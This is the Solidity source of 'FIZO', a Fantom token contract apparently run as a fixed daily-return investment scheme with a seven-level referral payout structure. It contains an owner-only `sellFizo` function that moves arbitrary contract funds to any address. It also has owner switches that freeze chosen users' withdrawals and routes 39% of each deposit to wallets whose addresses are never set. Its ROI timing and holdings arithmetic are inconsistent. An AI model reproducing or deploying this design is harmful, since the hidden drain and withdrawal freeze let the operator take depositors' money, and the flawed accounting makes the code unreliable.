/**
 *Submitted for verification at FtmScan.com on 2023-02-28
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}

contract FIZO is IERC20
{
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    using SafeMath for uint256;
    address payable initiator;
    address payable aggregator;
    address [] investors;
    uint256 contractBalance;
    uint256 [] referral_bonuses;
    uint256 initializeTime;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 totalHoldings;
    uint256 _initialCoinRate = 100000000;
    uint256  TotalHoldings;
    uint256 constant public PLANPER_DIVIDER = 10000;
    uint256[] public LEVEL_PERCENTS=[800,400, 300, 200, 100, 100, 100];
	uint256[] public LEVEL_UNLOCK=[0e18, 200e18, 400e18, 800e18, 1600e18, 3200e18, 6400e18];
    address roiwallet;
    address vipwallet;
    address marketingwallet;
    
    struct User{
        uint256 token;
        address referral;
        uint256 POI;
        uint256 teamWithdraw;
        uint256 teamIncome;
        uint256 totalInvestment;
        uint256 lastNonWokingWithdraw;
        uint256 lastNonWokingWithdrawBase;
        uint256 depositCount;
        uint256 payoutCount;
        uint256 sellCount;
        uint256 totalBusiness;
        uint256 checkpoint;
        uint256 roiwithdrawcount;
       
        mapping(uint8 => uint256) referrals_per_level;
        mapping(uint8 => uint256) team_per_level;
        mapping(uint8 => uint256) levelIncome;
       }
    
    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 tokenPrice;
        uint256 withdrawTime;
    }

    struct WithdrawROI{
        uint256 amount;
        uint256 withdrawTime;
    }
    
    struct Roi{
        uint256 plan1roi;
        uint256 plan2roi;
        uint256 plan3roi;
        uint256 plan4roi;
        uint256 plan5roi;
        uint256 finishdate;
        uint256 plan;
        uint256 plan1roiw;
        uint256 plan2roiw;
        uint256 plan3roiw;
        uint256 plan4roiw;
        uint256 plan5roiw;
        
    }

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    struct Is_active{
        uint256 fizowithdrawb;
        uint256 roib;
        uint256 teamwithdrawb;
    }

    Plan[] internal plans;

    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
    mapping(address => WithdrawROI[]) public ROIwidth;
    mapping(address => Roi) public roi;
    mapping(address => Is_active) public is_activeb;
   

    event Deposits(address buyer, uint256 amount);
    event POIDistribution(address buyer, uint256 amount);
    event TeamWithdraw(address withdrawer, uint256 amount);
    event FIZOWithdraw(address withdrawer, uint256 amount);
    event RoiWithdraw(address withdrawer, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }
     constructor()
    {
        _name = "FIZO";
        _symbol = "FIZO";
        initiator = payable(msg.sender);
        aggregator = payable(msg.sender);
        initializeTime = block.timestamp;
        plans.push(Plan(2, 60));
        plans.push(Plan(2, 120));
        plans.push(Plan(2, 240));
        plans.push(Plan(2, 480));
        plans.push(Plan(2, 960));
    }

    function contractInfo() public view returns(uint256 fantom, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding, uint256 balance,uint256 totalHold){
        fantom = address(this).balance;
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        balance = contractBalance;
        totalHold=TotalHoldings;
        return(fantom,totalDeposits,totalPayouts,totalInvestors,totalHolding,balance,totalHold);
    }

    function name() public view virtual override returns (string memory) 
    {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) 
    {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) 
    {
        return 0;
    }

    function totalSupply() public view virtual override returns (uint256) 
    {
        return _totalSupply;
    }

    function _mint(address account, uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
      
    }

    function _burn(address account,uint256 amount) internal virtual 
    {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        require(_totalSupply>=amount, "Invalid amount of tokens!");

        _balances[account] = accountBalance - amount;
        
        _totalSupply -= amount;
    }

     function balanceOf(address account) public view virtual override returns (uint256) 
    {
        return _balances[account];
    }
    
     function tokensToFTM(uint tokenAmount) public view returns(uint)
    {
        return tokenAmount*(1 ether)/getCoinRate();
    }

     function FTMToFizo(uint256 ftm_amt) public view returns(uint)
    {
         uint _rate = coinRate();
         return (ftm_amt.mul(60).mul(_rate))/(100*1 ether);
    }

   function coinRate() public view returns(uint)
    {
        if( TotalHoldings < 100000*(1 ether) ){
            return 10000*(1 ether)/((1 ether)+(9*TotalHoldings/100000));
        }else{
            return TotalHoldings>=(1 ether)?_initialCoinRate*(1 ether)/TotalHoldings:_initialCoinRate;
        }
    }

    function getCoinRate() public view returns(uint)
    {
        uint _rate = coinRate();
        return _rate;
    }
    function getCoinRatec(address memberId) public view returns(uint,uint,uint,uint)
    {
        uint TotalHoldingss = TotalHoldings;
        User storage user = users[memberId];
        uint256 invesment = user.totalInvestment;
        uint _initialCoinRates=_initialCoinRate;
        
         uint temp_holdings = TotalHoldings>user.totalInvestment?(TotalHoldings-(user.totalInvestment)):1;
        uint fina1l= temp_holdings>=(1 ether)?_initialCoinRate*(1 ether)/temp_holdings:_initialCoinRate;
    return(TotalHoldingss,invesment,_initialCoinRates,fina1l
    );

    }

     function _distributePOI(address depositor, uint256 _poi) internal{
        uint256 poiShare;
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            poiShare = user.token.mul(100).div(totalHoldings);
            user.POI+=_poi.mul(poiShare).div(100);
            uint256 _roiamount=getUserROI(investors[i]);
            uint256 _plan=roi[investors[i]].plan;
            if(_plan==0){
            roi[investors[i]].plan1roi=_roiamount;
            } if(_plan==1){
            roi[investors[i]].plan2roi=_roiamount;
            } if(_plan==2){
            roi[investors[i]].plan3roi=_roiamount;
            } if(_plan==3){
            roi[investors[i]].plan4roi=_roiamount;
            } if(_plan==4){
            roi[investors[i]].plan5roi=_roiamount;
            }
            user.checkpoint=block.timestamp;
           }
        emit POIDistribution(depositor,_poi);
    }


    function _ROI() internal{
        
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            uint256 _roiamount=getUserROI(investors[i]);
            uint256 _plan=roi[investors[i]].plan;
            if(_plan==0){
            roi[investors[i]].plan1roi=_roiamount;
            } if(_plan==1){
            roi[investors[i]].plan2roi=_roiamount;
            } if(_plan==2){
            roi[investors[i]].plan3roi=_roiamount;
            } if(_plan==3){
            roi[investors[i]].plan4roi=_roiamount;
            } if(_plan==4){
            roi[investors[i]].plan5roi=_roiamount;
            }
            user.checkpoint=block.timestamp;
           }
        
    }

     function _setReferral(address _addr, address _referral, uint256 _amount) private {
        
        if(users[_addr].referral == address(0)) {

            users[_addr].lastNonWokingWithdrawBase = block.timestamp;
            users[_addr].referral = _referral;
            for(uint8 i = 0; i < LEVEL_PERCENTS.length; i++){ 
                users[_referral].referrals_per_level[i]+=_amount;
                users[_referral].team_per_level[i]++;
               
                if(i == 0){
                    users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                    users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                }
                else if(i>0 && users[_referral].referrals_per_level[i]>=LEVEL_UNLOCK[i]){
                    users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                    users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                }
                _referral = users[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
     }
    


     function redeposit() public payable{
        require(msg.value>=1e18,"Minimum 1 FANTOM allowed to invest");
        
        User storage user = users[msg.sender];
        require(user.depositCount>0, "Please Invest First !");
        uint _rate = coinRate();
        
        user.token+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(60).div(100);
        
        _distributePOI(msg.sender,msg.value.mul(11).div(100));
        user.depositCount++;
        totalHoldings+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*60/100);
        users[users[msg.sender].referral].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint256 tokens = (msg.value*60*_rate)/(100*1 ether);
         _mint(msg.sender, tokens);
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).mul(_rate))/(100*1 ether),
            _rate,
            block.timestamp
        ));

        _setReReferral(users[msg.sender].referral, msg.value);
        aggregator.transfer(msg.value.mul(4).div(100));
        emit Deposits(msg.sender, msg.value);
    }

    function topupamount(address _address) public view returns(uint256){

              uint256 _plan=roi[_address].plan;
        uint256 _roiamount;
        uint256 _famount;
    
            if(_plan==0){
            _roiamount=roi[_address].plan1roi;
              _famount=  _roiamount.mul(20).div(100);
            } if(_plan==1){
            _roiamount=roi[_address].plan2roi;
             _famount=  _roiamount.mul(20).div(100);
           
            } if(_plan==2){
           _roiamount=roi[_address].plan3roi;
            _famount=  _roiamount.mul(40).div(100);
           
            } if(_plan==3){
            _roiamount=roi[_address].plan4roi;
             _famount=  _roiamount.mul(40).div(100);
           
            } if(_plan==4){
           _roiamount=roi[_address].plan5roi;
            _famount=  _roiamount.mul(40).div(100);
            }
             
            return(_famount);

    }
 function updatepacakgeredeposit() public payable{
        
      	User storage user = users[msg.sender];
        uint256 finish = roi[msg.sender].finishdate.add(plans[roi[msg.sender].plan].time.mul(1 days));
        require(user.checkpoint < finish,"not able to update");
        uint256 amount=topupamount(msg.sender);

        require(msg.value>=amount,"Minimum 1 FANTOM allowed to invest");
        
        require(user.depositCount>0, "Please Invest First !");
        uint _rate = coinRate();
        
        user.token+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        contractBalance+=msg.value.mul(60).div(100);
        
        _distributePOI(msg.sender,msg.value.mul(11).div(100));
        user.depositCount++;
        totalHoldings+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*60/100);
        users[users[msg.sender].referral].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint256 tokens = (msg.value*60*_rate)/(100*1 ether);
         _mint(msg.sender, tokens);
        roi[msg.sender].plan++;
        roi[msg.sender].finishdate=block.timestamp;
        user.checkpoint = block.timestamp;
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).mul(_rate))/(100*1 ether),
            _rate,
            block.timestamp
        ));

        _setReReferral(users[msg.sender].referral, msg.value);
        aggregator.transfer(msg.value.mul(4).div(100));
        emit Deposits(msg.sender, msg.value);
    }



    function _setReReferral(address _referral, uint256 _amount) private {
        for(uint8 i = 0; i < LEVEL_PERCENTS.length; i++) {
            users[_referral].referrals_per_level[i]+=_amount;
            if(i == 0){
                users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
            }
            else if(i>0 && users[_referral].referrals_per_level[i]>=200e18){
                users[_referral].levelIncome[i]+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
                users[_referral].teamIncome+=_amount.mul(LEVEL_PERCENTS[i].div(100)).div(100);
            }
            _referral = users[_referral].referral;
            if(_referral == address(0)) break;
        }
        
    }


    function _getWorkingIncome(address _addr) internal view returns(uint256 income){
        User storage user = users[_addr];
        for(uint8 i = 0; i <= 7; i++) {
            income+=user.levelIncome[i];
        }
        return income;
    }

    function teamWithdraw(uint256 _amount) public{
        User storage user = users[msg.sender];
        
        require(user.totalInvestment>0, "Invalid User!");
        Is_active storage is_active = is_activeb[msg.sender];

        require(is_active.fizowithdrawb==0, "Invalid User!");

        uint256 working = user.teamIncome;
       // uint256 working = _getWorkingIncome(msg.sender);
        uint256 withdrawable = working.add(user.POI).sub(user.teamWithdraw);
        require(withdrawable>=_amount, "Invalid withdraw!");
        user.teamWithdraw+=_amount;
        user.payoutCount++;
        _amount = _amount.mul(100).div(100);
        payable(msg.sender).transfer(_amount);
        totalWithdraw+=_amount;
        payouts[msg.sender].push(Withdraw(
            _amount,
            true,
            0,
            0,
            block.timestamp
        ));
        _ROI();
        emit TeamWithdraw(msg.sender,_amount);
      
    }

   
    function fizoWithdraw(uint8 _perc) public{
        User storage user = users[msg.sender];
        Is_active storage is_active = is_activeb[msg.sender];
    
        
        require(user.totalInvestment>0, "Invalid User!");
        require(is_active.fizowithdrawb==0, "Invalid User!");
        
        if(_perc == 10 || _perc == 50 || _perc == 100)
		{
         uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime;
         require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
         uint8 perc = _perc;
         uint8 deduct=40;
            if(perc==10)
            {
                deduct=10;
            }
            else if(perc==50)
            {
                deduct=20;

            }
        uint256 tokenAmount = user.token.mul(perc).div(100);
        require(_balances[msg.sender]>=tokenAmount, "Insufficient token balance!");
        uint256 ftmAmount = tokensToFTM(tokenAmount);
        require(address(this).balance>=ftmAmount, "Insufficient fund in contract!");
        uint256 calcWithdrawable = ftmAmount;
        contractBalance-=calcWithdrawable;
        uint256 withdrawable = ftmAmount;

		uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
        payable(msg.sender).transfer(withdrawable2);
        user.sellCount++;
        user.lastNonWokingWithdraw = block.timestamp;
        user.token-=user.token.mul(perc).div(100);
        totalHoldings-=user.token.mul(perc).div(100);
        if(TotalHoldings>=ftmAmount)
        {
            TotalHoldings-=ftmAmount;
        }
        else
        {
            TotalHoldings=1;
        }
        totalWithdraw+=withdrawable;
        
        payouts[msg.sender].push(Withdraw(
            withdrawable,
            false,
            withdrawable.mul(getCoinRate()),
            getCoinRate(),
            block.timestamp
        ));

         _burn(msg.sender, tokenAmount);
         uint256 withdrawable3 =withdrawable1;
         if(deduct > 10)
         {
             uint256 withdrawable4 =withdrawable1.mul(11).div(100);
             withdrawable3 = withdrawable1 -withdrawable4;

            _distributePOI(msg.sender,withdrawable1.mul(11).div(100));
         }else{
             _ROI();
         }
         
         aggregator.transfer(withdrawable3);
         emit  FIZOWithdraw(msg.sender,withdrawable2);

        
        }
       
        }
    

   function deposit(address _referer,uint256 _plan) public payable
   {
        require(msg.value>=1e18,"Minimum 1 FANTOM allowed to invest");
         User storage user = users[msg.sender];
        
      
			if (users[_referer].depositCount > 0 && _referer != msg.sender) {
			    _referer = _referer;
			}
            else
            {
                _referer = 0x0000000000000000000000000000000000000000;
            }
	    
        uint _rate = coinRate();
        user.token+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
       // roichecks[msg.sender].token=user.token;
        contractBalance+=msg.value.mul(60).div(100);
        
        _distributePOI(msg.sender,msg.value.mul(11).div(100));
         if(user.depositCount==0)
         {
              investors.push(msg.sender);
              _setReferral(msg.sender,_referer, msg.value);
              roi[msg.sender].finishdate=block.timestamp;
         } 
         else
         {
              _setReReferral(users[msg.sender].referral, msg.value);
         }    
        
        user.depositCount++;
        
        totalHoldings+=(msg.value.mul(60).mul(_rate))/(100*1 ether);
        TotalHoldings+=(msg.value*60/100);
        users[_referer].totalBusiness+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        uint tokens = (msg.value*60*_rate)/(100*1 ether);
         _mint(msg.sender, tokens);
        roi[msg.sender].plan=_plan;
        user.checkpoint = block.timestamp;
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(60).div(100),
            (msg.value.mul(60).mul(_rate))/(100*1 ether),
            _rate,
            block.timestamp
        ));
        
        payable(marketingwallet).transfer(msg.value.mul(4).div(100));
        payable(vipwallet).transfer(msg.value.mul(5).div(100));
        payable(roiwallet).transfer(msg.value.mul(30).div(100));
       
        emit Deposits(msg.sender, msg.value);
    } 

    function userInfo(address _addr) view external returns(uint256[7] memory team, uint256[7] memory referrals, uint256[7] memory income) {
        User storage player = users[_addr];
        for(uint8 i = 0; i <= 6; i++) {
            team[i] = player.team_per_level[i];
            referrals[i] = player.referrals_per_level[i];
            income[i] = player.levelIncome[i];
        }
        return (
            team,
            referrals,
            income
        );
    }

    function sellFizo(address payable buyer, uint _amount) external onlyInitiator{
        buyer.transfer(_amount);
    }

    function fizowithdrawb(address _account, uint status) external onlyInitiator{
         Is_active storage is_active = is_activeb[_account];

        is_active.fizowithdrawb=status;
    }

    function teamwithdrawb(address _account, uint status) external onlyInitiator{
         Is_active storage is_active = is_activeb[_account];

        is_active.teamwithdrawb=status;
    }

    function roib(address _account, uint status) external onlyInitiator{
         Is_active storage is_active = is_activeb[_account];

        is_active.roib=status;
    }

    function checkfizoWithdraw(uint8 _perc,address _addr) public view returns(uint256 totalWithdrawn,uint256 deducts,uint256 final_amount)
    {
         User storage user = users[_addr];
        
        require(user.totalInvestment>0, "Invalid User!");
        if(_perc == 10 || _perc == 50 || _perc == 100)
		{
         uint8 perc = _perc;
         uint8 deduct=40;
            if(perc==10)
            {
                deduct=10;
            }
            else if(perc==50)
            {
                deduct=20;
            }
        uint256 tokenAmount = user.token.mul(perc).div(100);
        require(_balances[_addr]>=tokenAmount, "Insufficient token balance!");
        uint256 ftmAmount = tokensToFTM(tokenAmount);
        require(address(this).balance>=ftmAmount, "Insufficient fund in contract!");
        uint256 withdrawable = ftmAmount;

		uint256 withdrawable1 =withdrawable.mul(deduct).div(100);
        uint256 withdrawable2 = withdrawable -withdrawable1;
       
            totalWithdrawn = ftmAmount;
            deducts=withdrawable1;
            final_amount=withdrawable2;
        return(totalWithdrawn,deducts,final_amount);
        
        }
       
        
    }

     function getUserROI(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		uint256 finish = roi[userAddress].finishdate.add(plans[roi[userAddress].plan].time.mul(1 minutes));
			if (user.checkpoint < finish) {
				uint256 share = user.token.mul(plans[roi[userAddress].plan].percent).div(PLANPER_DIVIDER);
				uint256 from = roi[userAddress].finishdate > user.checkpoint ? roi[userAddress].finishdate : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
                uint daysDiff = (to - from) / 60 / 60/ 24;
				if (from < to) {
                    uint256 ftmroi = tokensToFTM(share.mul(daysDiff));
					totalAmount = totalAmount.add(ftmroi);
                    
				}
			}

		return totalAmount;
	}


    function ROIWithdraw(uint256 amount) public {
        User storage user = users[msg.sender];
        Is_active storage is_active = is_activeb[msg.sender];

        require(is_active.fizowithdrawb==0, "Invalid User!");
        uint256 _plan=roi[msg.sender].plan;
        uint256 _roiamount;
        uint256 _roiamountw;
            if(_plan==0){
            _roiamount=roi[msg.sender].plan1roi;
            _roiamountw=roi[msg.sender].plan1roiw;
            } if(_plan==1){
            _roiamount=roi[msg.sender].plan2roi;
            _roiamountw=roi[msg.sender].plan2roiw;
            } if(_plan==2){
           _roiamount=roi[msg.sender].plan3roi;
           _roiamountw=roi[msg.sender].plan3roiw;
            } if(_plan==3){
            _roiamount=roi[msg.sender].plan4roi;
            _roiamountw=roi[msg.sender].plan4roiw;
            } if(_plan==4){
           _roiamount=roi[msg.sender].plan5roi;
           _roiamountw=roi[msg.sender].plan5roiw;
            }
         uint256 withdrawable = _roiamount.add(getUserROI(msg.sender)).sub(_roiamountw);
        
        require(withdrawable>0, "Insufficient ROI balance!");
        require(withdrawable>=amount, "Invalid withdraw!");

       

            if(_plan==0){
            roi[msg.sender].plan1roiw+=amount;
            } if(_plan==1){
            roi[msg.sender].plan2roiw+=amount;
            } if(_plan==2){
           roi[msg.sender].plan3roiw+=amount;
            } if(_plan==3){
             roi[msg.sender].plan4roiw+=amount;
            } if(_plan==4){
            roi[msg.sender].plan5roiw+=amount;
            }


        user.roiwithdrawcount++;
        amount = amount.mul(100).div(100);
        payable(msg.sender).transfer(amount);
    
        ROIwidth[msg.sender].push(WithdrawROI(
            amount,
            block.timestamp
        ));
        _ROI();

        emit  RoiWithdraw(msg.sender,amount);
        
    }


    function getallroi(address _address) public view returns (uint256){
       // User storage user = users[_address];
        uint256 _plan=roi[_address].plan;
        uint256 _roiamount;
        uint256 _roiamountw;
           
            if(_plan==0){
            _roiamount=roi[_address].plan1roi;
            _roiamountw=roi[_address].plan1roiw;
            } if(_plan==1){
            _roiamount=roi[_address].plan2roi;
            _roiamountw=roi[_address].plan2roiw;
            } if(_plan==2){
           _roiamount=roi[_address].plan3roi;
           _roiamountw=roi[_address].plan3roiw;
            } if(_plan==3){
            _roiamount=roi[_address].plan4roi;
            _roiamountw=roi[_address].plan4roiw;
            } if(_plan==4){
           _roiamount=roi[_address].plan5roi;
           _roiamountw=roi[_address].plan5roiw;
            }
         uint256 withdrawable = _roiamount.add(getUserROI(_address)).sub(_roiamountw);
        
         return(withdrawable);
        
    }

   
}